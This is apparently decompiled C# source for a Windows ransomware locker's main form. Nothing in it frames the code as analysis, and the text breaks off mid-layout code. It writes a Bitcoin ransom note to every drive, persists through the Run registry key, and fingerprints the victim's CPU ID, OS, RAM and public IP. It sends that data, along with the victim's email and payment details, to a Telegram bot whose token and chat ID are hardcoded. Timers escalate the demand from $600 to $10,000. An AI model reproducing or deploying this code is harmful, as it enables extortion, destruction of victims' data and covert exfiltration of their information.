using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SF.Properties;

namespace SF;

public class Form1 : Form
{
	private DateTime EventDate = DateTime.Now + new TimeSpan(1, 24, 59, 10);

	private DateTime EventDate2 = DateTime.Now + new TimeSpan(2, 23, 58, 20);

	private DateTime EventDate3 = DateTime.Now + new TimeSpan(3, 22, 57, 30);

	private DateTime EventDate4 = DateTime.Now + new TimeSpan(4, 21, 56, 40);

	private DateTime EventDate5 = DateTime.Now + new TimeSpan(5, 20, 55, 50);

	private string persolanIDkey;

	private IContainer components = null;

	private Label label1;

	private ToolTip tips;

	private Label lblattacker;

	private Timer tim1;

	private Timer tim3;

	private Timer tim4;

	private Timer tim5;

	private Label label15;

	private Label label14;

	private Label lblhours;

	private Label label4;

	private Label lblday;

	private Timer tim2;

	private Label lblsec;

	private Label lblmin;

	private Label label3;

	private TextBox txtid2;

	private TextBox txtid1;

	private TextBox txtEmail;

	private Label lblnotification;

	private Button btnRequest;

	private Label label13;

	private Label label11;

	private GroupBox groupBox2;

	private Label label2;

	private Label lblwal1;

	private Label lblwal2;

	private GroupBox gpstep;

	private Label label5;

	public static string Message { get; } = "\r\nAll your data has been locked us. You want to return? Contact to: Decrypt.Russ@protonmail.com\n\r All your information is locked With Strong Randsomware\n\r If You Want To Get Your Information Back Fast And Easy Like Never Happend , You Have To Pay\n\r((( We only Accept Bitcoin )))\n\rYou Dont Know About Bitcoin !? :\n\rhttps://www.investopedia.com/tech/how-to-buy-bitcoin/\n\rHow Can i Buy Bitcoin To Any Country :\r\nhttps://localbitcoins.com\r\nhttps://paxful.com/\r\n>>>>>>>>>>>> Cost For Your All Data Decrypt : $1000  <<<<<<<<<<<<<<<<<<\r\n\r\n(( Send Email Us Only You Want Pay : Decrypt.Russ@protonmail.com ))\r\nApart From Paying Any Other Words You Use In Email = Blocked From Us  So .. Do Like Smart Man\r\n(( After Read This Note : You Only Have 5 Days To Back Your Files , Then You Cant Back ( Beacuse You Late Time End ) We Will Delete Your Decrypt Key ))\r\n\r\nWe are Professionals So No Antivirus Or Software Will Help You\r\nIt Only Destroys Your Information\r\nSo ... Don't Act like a Fool Only We Can Save Your Job And Information\r\n\r\nTo Prove That We Can Only Get Your information Back : You Can Send Us A One Locked File And We Will Decrypt It\r\nThe File Should Not Important Dont .... Send .Jpg .Png .Txt Beacuse Its Only For Prove\r\n\r\nNOTE :\r\n- My mother is sick\r\n- I have no money to open for God's Please\r\n- Give me the key first, then I'll Pay\r\n- Half Open information I Pay Half\r\n(( We Don't Care All Up Words ))\r\nNo Money ! No Decryption";


	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\ReadME-Tsar.txt", Message + " Your Personal KEY: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText(Main.DesktopDirectory + "\\ReadME-Tsar.txt", Message + " Your Personal KEY: " + text);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			SetStartup();
			blackrun();
		}
		catch (Exception)
		{
		}
		tim1.set_Enabled(true);
		tim1.Start();
	}

	public void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
	}

	public void blackrun()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (text == "")
				{
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = new WebClient().DownloadString("http://icanhazip.com");
		string physicalMemory = GetPhysicalMemory();
		string processorInformation = GetProcessorInformation();
		string machineName = Environment.MachineName;
		string oSInformation = GetOSInformation();
		string text3 = text;
		string format = "https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}";
		string j73F = Settings.Default.J73F72;
		string jF = Settings.Default.JF7372;
		string arg = "\nAttacker: " + ((Control)lblattacker).get_Text() + "\n\nTarget ID: " + text3 + "\nTarget Name: " + machineName + "\nTarget OS: " + oSInformation + "\nTarget CPU: " + processorInformation + "\nTarget RAM: " + physicalMemory + "\nTarget IP: " + text2 + "\nTarget Location:  https://www.ip-tracker.org/locator/ip-lookup.php?ip=" + text2 + "\nTarget Payout: N/A\nPErsonalID==>" + persolanIDkey;
		format = string.Format(format, j73F, jF, arg);
		WebRequest webRequest = WebRequest.Create(format);
		Stream responseStream = webRequest.GetResponse().GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text4 = "";
		StringBuilder stringBuilder = new StringBuilder();
		while (text4 != null)
		{
			text4 = streamReader.ReadLine();
			if (text4 != null)
			{
				stringBuilder.Append(text4);
			}
		}
		stringBuilder.ToString();
	}

	public void blackdone()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (text == "")
				{
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = new WebClient().DownloadString("http://icanhazip.com");
		GetPhysicalMemory();
		GetProcessorInformation();
		string machineName = Environment.MachineName;
		string oSInformation = GetOSInformation();
		string text3 = text;
		string format = "https://api.telegram.org/bot854979584:AAGigxt4fyVv0Cp2XZPMk3Ukr-ycTZB-SgU/sendMessage?chat_id=698678627&text={2}";
		string j73F = Settings.Default.J73F72;
		string jF = Settings.Default.JF7372;
		string arg = "\nAttacker: " + ((Control)lblattacker).get_Text() + "\n\nTarget ID: " + text3 + "\nTarget Name: " + machineName + "\nTarget OS: " + oSInformation + "\nTarget IP: " + text2 + "\nTarget Location:  https://www.ip-tracker.org/locator/ip-lookup.php?ip=" + text2 + "\nTarget Payout: Done";
		format = string.Format(format, j73F, jF, arg);
		WebRequest webRequest = WebRequest.Create(format);
		Stream responseStream = webRequest.GetResponse().GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text4 = "";
		StringBuilder stringBuilder = new StringBuilder();
		while (text4 != null)
		{
			text4 = streamReader.ReadLine();
			if (text4 != null)
			{
				stringBuilder.Append(text4);
			}
		}
		stringBuilder.ToString();
	}

	public static string GetOSInformation()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				try
				{
					return ((string)((ManagementBaseObject)val2).get_Item("Caption")).Trim() + ", " + (string)((ManagementBaseObject)val2).get_Item("OSArchitecture");
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "BIOS Maker: Unknown";
	}

	private static ulong GetTotalMemoryInBytes()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		return new ComputerInfo().get_TotalPhysicalMemory();
	}

	public static string GetProcessorInformation()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				string text = (string)((ManagementBaseObject)val2).get_Item("Name");
				text = text.Replace("(TM)", "™").Replace("(tm)", "™").Replace("(R)", "®")
					.Replace("(r)", "®")
					.Replace("(C)", "©")
					.Replace("(c)", "©")
					.Replace("    ", " ")
					.Replace("  ", " ");
				result = text;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string GetPhysicalMemory()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		ManagementScope val = new ManagementScope();
		ObjectQuery val2 = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
		ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, val2);
		ManagementObjectCollection val4 = val3.Get();
		long num = 0L;
		long num2 = 0L;
		ManagementObjectEnumerator enumerator = val4.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val5 = (ManagementObject)enumerator.get_Current();
				num2 = Convert.ToInt64(((ManagementBaseObject)val5).get_Item("Capacity"));
				num += num2;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return num / 1024L / 1024L + " MB";
	}

	private void tim1_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = EventDate - DateTime.Now;
		if (timeSpan.TotalSeconds < 0.0)
		{
			tim1.set_Enabled(false);
			((Control)gpstep).set_Text("  Step 1: For Decrypt pay 600$ to two wallet  ");
			((Control)lblwal1).set_Text("200 $");
			((Control)lblwal2).set_Text("400 $");
			tim2.set_Enabled(true);
			tim2.Start();
		}
		else
		{
			((Control)lblday).set_Text(string.Concat(timeSpan.Days));
			((Control)lblhours).set_Text(string.Concat(timeSpan.Hours));
			((Control)lblmin).set_Text(string.Concat(timeSpan.Minutes));
			((Control)lblsec).set_Text(string.Concat(timeSpan.Seconds));
		}
	}

	private void tim2_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = EventDate2 - DateTime.Now;
		if (timeSpan.TotalSeconds < 0.0)
		{
			tim2.set_Enabled(false);
			((Control)gpstep).set_Text("  Step 1: For Decrypt pay 1200$ to two wallet  ");
			((Control)lblwal1).set_Text("400 $");
			((Control)lblwal2).set_Text("800 $");
			tim3.set_Enabled(true);
			tim3.Start();
		}
		else
		{
			((Control)lblday).set_Text(string.Concat(timeSpan.Days));
			((Control)lblhours).set_Text(string.Concat(timeSpan.Hours));
			((Control)lblmin).set_Text(string.Concat(timeSpan.Minutes));
			((Control)lblsec).set_Text(string.Concat(timeSpan.Seconds));
		}
	}

	private void tim3_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = EventDate3 - DateTime.Now;
		if (timeSpan.TotalSeconds < 0.0)
		{
			tim3.set_Enabled(false);
			((Control)gpstep).set_Text("  Step 1: For Decrypt pay 2400$ to two wallet  ");
			((Control)lblwal1).set_Text("800 $");
			((Control)lblwal2).set_Text("1600 $");
			tim4.set_Enabled(true);
			tim4.Start();
		}
		else
		{
			((Control)lblday).set_Text(string.Concat(timeSpan.Days));
			((Control)lblhours).set_Text(string.Concat(timeSpan.Hours));
			((Control)lblmin).set_Text(string.Concat(timeSpan.Minutes));
			((Control)lblsec).set_Text(string.Concat(timeSpan.Seconds));
		}
	}

	private void tim4_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = EventDate4 - DateTime.Now;
		if (timeSpan.TotalSeconds < 0.0)
		{
			tim4.set_Enabled(false);
			((Control)gpstep).set_Text("  Step 1: For Decrypt pay 4800$ to two wallet  ");
			((Control)lblwal1).set_Text("1800 $");
			((Control)lblwal2).set_Text("3000 $");
			tim5.set_Enabled(true);
			tim5.Start();
		}
		else
		{
			((Control)lblday).set_Text(string.Concat(timeSpan.Days));
			((Control)lblhours).set_Text(string.Concat(timeSpan.Hours));
			((Control)lblmin).set_Text(string.Concat(timeSpan.Minutes));
			((Control)lblsec).set_Text(string.Concat(timeSpan.Seconds));
		}
	}

	private void tim5_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = EventDate5 - DateTime.Now;
		if (timeSpan.TotalSeconds < 0.0)
		{
			tim5.set_Enabled(false);
			((Control)gpstep).set_Text("  Step 1: For Decrypt pay 10000$ to two wallet  ");
			((Control)lblwal1).set_Text("5000 $");
			((Control)lblwal2).set_Text("5000 $");
		}
		else
		{
			((Control)lblday).set_Text(string.Concat(timeSpan.Days));
			((Control)lblhours).set_Text(string.Concat(timeSpan.Hours));
			((Control)lblmin).set_Text(string.Concat(timeSpan.Minutes));
			((Control)lblsec).set_Text(string.Concat(timeSpan.Seconds));
		}
	}

	private void btnRequest_Click_1(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		string empty = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (empty == "")
				{
					empty = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
					break;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		if (((Control)txtEmail).get_Text().Trim() == string.Empty)
		{
			((Control)lblnotification).set_ForeColor(Color.Red);
			((Control)lblnotification).set_Text("");
			return;
		}
		if (((Control)txtid1).get_Text().Trim() == string.Empty)
		{
			((Control)lblnotification).set_ForeColor(Color.Red);
			((Control)lblnotification).set_Text("");
			return;
		}
		if (((Control)txtid2).get_Text().Trim() == string.Empty)
		{
			((Control)lblnotification).set_ForeColor(Color.Red);
			((Control)lblnotification).set_Text("Write Your Email In Text BOX");
			return;
		}
		string text = new WebClient().DownloadString("http://icanhazip.com");
		string text2 = Encryption.Run();
		string format = "https://api.telegram.org/bot854979584:AAGigxt4fyVv0Cp2XZPMk3Ukr-ycTZB-SgU/sendMessage?chat_id=698678627&text={2}";
		string f73J = Settings.Default.F73J72;
		string jF = Settings.Default.JF7273;
		string arg = "Target IP: " + text + "\n\nTarget Email: " + ((Control)txtEmail).get_Text() + "\nTXTID 1: " + ((Control)txtid1).get_Text() + "\nTXTID 2: " + ((Control)txtid2).get_Text() + "\nPersonal Key: " + text2;
		format = string.Format(format, f73J, jF, arg);
		WebRequest webRequest = WebRequest.Create(format);
		Stream responseStream = webRequest.GetResponse().GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text3 = "";
		StringBuilder stringBuilder = new StringBuilder();
		while (text3 != null)
		{
			text3 = streamReader.ReadLine();
			if (text3 != null)
			{
				stringBuilder.Append(text3);
			}
		}
		stringBuilder.ToString();
		((Control)lblnotification).set_ForeColor(Color.Lime);
		((Control)lblnotification).set_Text("I Will Send You Email in 2 Hours");
		((Control)txtEmail).set_Enabled(false);
		((Control)txtid1).set_Enabled(false);
		((Control)txtid2).set_Enabled(false);
		((Control)btnRequest).set_Enabled(false);
		blackdone();
	}

	private void lblmin_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Expected O, but got Unknown
		//IL_033e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0348: Expected O, but got Unknown
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dc: Expected O, but got Unknown
		//IL_0466: Unknown result type (might be due to invalid IL or missing references)
		//IL_0470: Expected O, but got Unknown
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0504: Expected O, but got Unknown
		//IL_058e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0598: Expected O, but got Unknown
		//IL_0639: Unknown result type (might be due to invalid IL or missing references)
		//IL_0643: Expected O, but got Unknown
		//IL_06cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d7: Expected O, but got Unknown
		//IL_0778: Unknown result type (might be due to invalid IL or missing references)
		//IL_0782: Expected O, but got Unknown
		//IL_081f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0829: Expected O, but got Unknown
		//IL_08d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08db: Expected O, but got Unknown
		//IL_0987: Unknown result type (might be due to invalid IL or missing references)
		//IL_0991: Expected O, but got Unknown
		//IL_0a2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a37: Expected O, but got Unknown
		//IL_0b47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b51: Expected O, but got Unknown
		//IL_0bd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be2: Expected O, but got Unknown
		//IL_0dc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dcf: Expected O, but got Unknown
		//IL_0e68: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e72: Expected O, but got Unknown
		//IL_0efb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f05: Expected O, but got Unknown
		//IL_0f95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f9f: Expected O, but got Unknown
		//IL_103b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1045: Expected O, but got Unknown
		//IL_10db: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e5: Expected O, but got Unknown
		//IL_11fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1207: Expected O, but got Unknown
		//IL_1225: Unknown result type (might be due to invalid IL or missing references)
		//IL_122f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		lblattacker = new Label();
		tim1 = new Timer(components);
		tim3 = new Timer(components);
		tim4 = new Timer(components);
		tim5 = new Timer(components);
		label15 = new Label();
		label14 = new Label();
		lblhours = new Label();
		label4 = new Label();
		lblday = new Label();
		tim2 = new Timer(components);
		lblsec = new Label();
		lblmin = new Label();
		label3 = new Label();
		tips = new ToolTip(components);
		txtid2 = new TextBox();
		txtid1 = new TextBox();
		txtEmail = new TextBox();
		lblnotification = new Label();
		btnRequest = new Button();
		label13 = new Label();
		label11 = new Label();
		groupBox2 = new GroupBox();
		lblwal1 = new Label();
		label2 = new Label();
		lblwal2 = new Label();
		gpstep = new GroupBox();
		label5 = new Label();
		((Control)groupBox2).SuspendLayout();
		((Control)gpstep).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Consolas", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Lime);
		((Control)label1).set_Location(new Point(26, 96));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(320, 22));
		((Control)label1).set_TabIndex(26);
		((Control)label1).set_Text("What's Happened to my computer?");
		((Control)lblattacker).set_AutoSize(true);
		((Control)lblattacker).set_Font(new Font("Times New Roman", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)178));
		((Control)lblattacker).set_ForeColor(Color.White);
		((Control)lblattacker).set_Location(new Point(230, 9));
		((Control)lblattacker).set_Name("lblattacker");
		((Control)lblattacker).set_Size(new Size(481, 73));
		((Control)lblattacker).set_TabIndex(31);
		((Control)lblattacker).set_Text("You Are Crypted!");
		tim1.add_Tick((EventHandler)tim1_Tick);
		tim3.add_Tick((EventHandler)tim3_Tick);
		tim4.add_Tick((EventHandler)tim4_Tick);
		tim5.add_Tick((EventHandler)tim5_Tick);
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label15).set_ForeColor(Color.Lime);
		((Control)label15).set_Location(new Point(527, 161));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(35, 37));
		((Control)label15).set_TabIndex(36);
		((Control)label15).set_Text(":");
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_ForeColor(Color.Lime);
		((Control)label14).set_Location(new Point(627, 161));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(35, 37));
		((Control)label14).set_TabIndex(35);
		((Control)label14).set_Text(":");
		((Control)lblhours).set_AutoSize(true);
		((Control)lblhours).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblhours).set_ForeColor(Color.Lime);
		((Control)lblhours).set_Location(new Point(785, 161));
		((Control)lblhours).set_Name("lblhours");
		((Control)lblhours).set_Size(new Size(53, 37));
		((Control)lblhours).set_TabIndex(34);
		((Control)lblhours).set_Text("00");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(734, 161));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(35, 37));
		((Control)label4).set_TabIndex(33);
		((Control)label4).set_Text(":");
		((Control)lblday).set_AutoSize(true);
		((Control)lblday).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblday).set_ForeColor(Color.Lime);
		((Control)lblday).set_Location(new Point(668, 161));
		((Control)lblday).set_Name("lblday");
		((Control)lblday).set_Size(new Size(53, 37));
		((Control)lblday).set_TabIndex(32);
		((Control)lblday).set_Text("00");
		tim2.add_Tick((EventHandler)tim2_Tick);
		((Control)lblsec).set_AutoSize(true);
		((Control)lblsec).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblsec).set_ForeColor(Color.Lime);
		((Control)lblsec).set_Location(new Point(568, 161));
		((Control)lblsec).set_Name("lblsec");
		((Control)lblsec).set_Size(new Size(53, 37));
		((Control)lblsec).set_TabIndex(38);
		((Control)lblsec).set_Text("00");
		((Control)lblmin).set_AutoSize(true);
		((Control)lblmin).set_Font(new Font("Consolas", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblmin).set_ForeColor(Color.Lime);
		((Control)lblmin).set_Location(new Point(468, 161));
		((Control)lblmin).set_Name("lblmin");
		((Control)lblmin).set_Size(new Size(53, 37));
		((Control)lblmin).set_TabIndex(37);
		((Control)lblmin).set_Text("00");
		((Control)lblmin).add_Click((EventHandler)lblmin_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Consolas", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Lime);
		((Control)label3).set_Location(new Point(494, 286));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(344, 18));
		((Control)label3).set_TabIndex(28);
		((Control)label3).set_Text("Time Left ( Payment Will be raised to 2x )");
		((Control)txtid2).set_BackColor(Color.Black);
		((TextBoxBase)txtid2).set_BorderStyle((BorderStyle)1);
		((Control)txtid2).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtid2).set_ForeColor(Color.Lime);
		((Control)txtid2).set_Location(new Point(15, 123));
		((TextBoxBase)txtid2).set_Multiline(true);
		((Control)txtid2).set_Name("txtid2");
		((Control)txtid2).set_Size(new Size(385, 75));
		((Control)txtid2).set_TabIndex(3);
		tips.SetToolTip((Control)(object)txtid2, "Example: https://www.blockchain.com/btc/tx/f6ba37e140b41180487495db80c11820779ae1df901dc300d5b87f91c41204cd");
		((Control)txtid1).set_BackColor(Color.Black);
		((TextBoxBase)txtid1).set_BorderStyle((BorderStyle)1);
		((Control)txtid1).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtid1).set_ForeColor(Color.Lime);
		((Control)txtid1).set_Location(new Point(15, 65));
		((Control)txtid1).set_Name("txtid1");
		((Control)txtid1).set_Size(new Size(385, 23));
		((Control)txtid1).set_TabIndex(2);
		((Control)txtid1).set_Text("mali Target");
		tips.SetToolTip((Control)(object)txtid1, "Example: https://www.blockchain.com/btc/tx/f6ba37e140b41180487495db80c11820779ae1df901dc300d5b87f91c41204cd");
		((Control)txtEmail).set_BackColor(Color.Black);
		((TextBoxBase)txtEmail).set_BorderStyle((BorderStyle)1);
		((Control)txtEmail).set_Font(new Font("Consolas", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmail).set_ForeColor(Color.Lime);
		((Control)txtEmail).set_Location(new Point(106, 36));
		((Control)txtEmail).set_Name("txtEmail");
		((Control)txtEmail).set_Size(new Size(294, 23));
		((Control)txtEmail).set_TabIndex(1);
		((Control)txtEmail).set_Text("MR_Liosion@protonmail.com");
		tips.SetToolTip((Control)(object)txtEmail, "Example: test@gmail.com");
		((Control)lblnotification).set_AutoSize(true);
		((Control)lblnotification).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblnotification).set_ForeColor(Color.Lime);
		((Control)lblnotification).set_Location(new Point(12, 221));
		((Control)lblnotification).set_Name("lblnotification");
		((Control)lblnotification).set_Size(new Size(0, 16));
		((Control)lblnotification).set_TabIndex(12);
		((Control)btnRequest).set_Cursor(Cursors.get_Hand());
		((ButtonBase)btnRequest).set_FlatStyle((FlatStyle)0);
		((Control)btnRequest).set_Location(new Point(86, 222));
